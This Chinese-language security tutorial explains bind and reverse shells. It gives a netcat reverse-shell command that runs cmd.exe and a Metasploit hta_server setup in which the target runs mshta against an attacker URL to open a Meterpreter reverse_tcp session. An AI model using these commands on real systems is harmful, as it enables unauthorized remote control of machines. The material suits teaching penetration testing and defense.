### 什么是正向Shell？

![](img/c49a8d8e38dd136d896e774b0146a828_22.png)

正向Shell是指控制端主动发起连接请求去连接被控制端。中间的网络链路不存在阻碍。

![](img/c49a8d8e38dd136d896e774b0146a828_24.png)

![](img/c49a8d8e38dd136d896e774b0146a828_25.png)

**正向Shell原理概括**：攻击者（控制端）主动连接目标机器（被控端）。

### 什么是反向Shell（反弹Shell）？

反向Shell是指被控端主动发起连接请求去连接控制端。这种方法通常用于被控端处于防火墙之后或存在网络策略限制，导致控制端无法直接访问的情况。

![](img/c49a8d8e38dd136d896e774b0146a828_27.png)

![](img/c49a8d8e38dd136d896e774b0146a828_29.png)

![](img/c49a8d8e38dd136d896e774b0146a828_31.png)

**反向Shell原理概括**：目标机器（被控端）主动连接攻击者（控制端）的监听端口。

*   **控制端（监听）**：`nc -lvp 54321`
*   **被控端（连接）**：`nc <控制端IP> 54321 -e cmd.exe`

**核心参数解释**：
*   `-l`：进入监听模式。
*   `-v`：显示详细信息。
*   `-p`：指定本地端口。
*   `-e`：在连接建立后执行指定程序（如`cmd.exe`）。

### 方法二：使用MSHTA执行远程HTA文件

MSHTA是Windows系统自带的用于解释执行HTA（HTML Application）文件的程序。我们可以利用它来执行恶意HTA脚本以获取Shell。

![](img/c49a8d8e38dd136d896e774b0146a828_90.png)

![](img/c49a8d8e38dd136d896e774b0146a828_92.png)

以下是利用Metasploit框架生成并交付HTA载荷的步骤：

![](img/c49a8d8e38dd136d896e774b0146a828_94.png)

1.  启动Metasploit的`exploit/windows/misc/hta_server`模块。
2.  配置模块选项，主要是设置服务器主机（SRVHOST）和端口（SRVPORT），即用于托管恶意HTA文件的Web服务地址。
3.  配置Payload选项。由于是反弹Shell，我们选择`windows/meterpreter/reverse_tcp`。需要设置LHOST（监听IP）和LPORT（监听端口），即攻击者接收连接的地址。
4.  执行`exploit`命令，模块会生成一个HTA文件的URL。
5.  在目标Windows机器上执行命令：`mshta.exe <生成的URL>`。
6.  执行后，目标机将连接回攻击者设定的LHOST和LPORT，从而在Metasploit中建立一个Meterpreter会话。

![](img/c49a8d8e38dd136d896e774b0146a828_96.png)

![](img/c49a8d8e38dd136d896e774b0146a828_98.png)

**关键命令流程**：
```bash
use exploit/windows/misc/hta_server
set SRVHOST <你的IP>
set SRVPORT 8080
set payload windows/meterpreter/reverse_tcp
set LHOST <你的IP>
set LPORT 5555
exploit
```
在目标机执行：`mshta.exe http://<你的IP>:8080/<随机路径>.hta`
